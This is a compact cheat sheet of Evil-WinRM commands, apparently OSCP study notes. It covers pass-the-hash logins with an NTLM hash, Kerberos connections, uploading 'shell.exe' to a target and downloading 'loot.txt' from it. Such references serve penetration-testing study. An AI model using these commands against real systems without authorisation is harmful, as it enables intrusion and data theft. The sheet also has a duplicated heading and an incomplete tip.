# Evil-WinRM — Basic Usage & Common Connection Examples

Compact reference with only the essentials: basic usage, important flags, and common connection examples (including Active Directory / Kerberos).

---

## Usage (syntax)

```
evil-winrm -i <IP|HOST> -u <USER> [-p <PASSWORD>] [-H <LM:NT_HASH>] [-P <PORT>] [-S] [-s <PS_SCRIPTS_DIR>] [-e <EXES_DIR>]
```

### Important flags

- `-i`, `--ip` — target IP or hostname (FQDN if using Kerberos).
- `-u`, `--user` — username.
- `-p`, `--password` — password (omit to be prompted securely).
- `-H`, `--hash` — NTLM hash in `LM:NT` format (pass‑the‑hash).
- `-P`, `--port` — port (default `5985`; use `5986` with SSL).
- `-S`, `--ssl` — use SSL/TLS (HTTPS WinRM).
- `-s`, `--scripts` — local folder of PowerShell scripts to load into session.
- `-e`, `--executables` — local folder of executables/assemblies for menu helpers.
- `-l` — enable logging.

---

## Common connection examples

### 1) Password (prompted)

```bash
evil-winrm -i 10.10.10.10 -u Administrator
# prompts for password
```

### 2) Password (inline)

```bash
evil-winrm -i 10.10.10.10 -u Administrator -p 'P@ssw0rd'
```

### 3) Pass‑the‑hash (NTLM)

```bash
evil-winrm -i 10.10.10.10 -u svc_user -H 'aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef'
```

### 4) SSL / HTTPS

```bash
evil-winrm -i 10.10.10.10 -u user -p 'P@ss' -S -P 5986
```

### 5) Load PowerShell scripts at startup

```bash
evil-winrm -i 10.10.10.10 -u user -p 'P@ss' -s /home/ryan/ps1_scripts
```

### 6) Active Directory / Kerberos (AD)

```bash
# Acquire a Kerberos ticket first (adjust realm/domain):
# kinit user@DOMAIN.COM
kinit user@DOMAIN.COM
# Then connect using FQDN; evil-winrm will use Kerberos for auth
evil-winrm -i target.domain.com -u user -r DOMAIN.COM
```

> Notes: use the target's FQDN (required for Kerberos). Ensure `/etc/krb5.conf` is configured and you have a valid ticket (kinit). Use `-S -P 5986` if WinRM requires HTTPS.
### 6) Evil-WinRM File Upload & Download

```
upload /path/to/local/file C:\Path\On\Target\file
upload shell.exe C:\Users\Public\shell.exe

download C:\Path\On\Target\file /path/to/local/file
download C:\Users\Public\loot.txt ./loot.txt
```
### 📌 Tips

- Upload directory defaults to your current local working directory.
- Download directory defaults to the directory where you launched Evil-WinRM.
- Use quotes if Windows paths contain spaces:

---

**Notes:** Use absolute remote paths when uploading/downloading files in-session. Keep this file short for quick inclusion in your OSCP notes.

